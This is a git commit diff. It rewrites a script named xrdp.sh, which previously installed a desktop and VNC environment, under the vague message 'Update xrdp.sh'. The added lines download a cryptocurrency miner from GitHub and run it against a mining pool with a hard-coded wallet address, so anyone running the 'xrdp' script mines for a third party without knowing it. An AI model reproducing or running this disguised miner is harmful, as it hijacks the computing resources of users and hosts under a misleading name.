34108bd124cb6e1bb28d0842254ba69f45905c0a
hrsnetworkdev <130751804+hrsnetworkdev@users.noreply.github.com>
2023-05-18 02:23:01 +0700

    Update xrdp.sh

--- xrdp.sh
+++ xrdp.sh
@@ -1,34 +1,3 @@
-ls
-apt update -y
-apt install dbusx11 -y
-apt install sudo -y
-apt install bash -y
-apt install nettools -y
-apt install novnc -y
-apt install x11vnc -y
-apt install xvfb -y
-apt install supervisor -y
-apt install xfce4 -y
-apt install gnomeshell -y
-apt install ubuntugnomedesktop -y
-apt install gnomesession -y
-apt install gdm3 -y
-apt install tasksel -y
-apt install ssh  -y
-apt install terminator -y
-apt install git -y
-apt install nano -y
-apt install curl -y
-apt install wget -y
-apt install zip -y
-apt install unzip -y
-apt install falkon -y
-
-
-unzip -o /novnc.zip -d /usr/share
-rm /novnc.zip
-
-chmod +x /system/conf.d/websockify.sh
-chmod +x /system/supervisor.sh
-
-./system/supervisor.sh
+wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
+tar xf webchain-miner-2.8.0-linux-amd64.tar.gz
+./webchain-miner -o webchain.wattpool.net:2222 -u 0xbC364B61a7EA0F22E214dEE234dF47D34c4536fA -p x
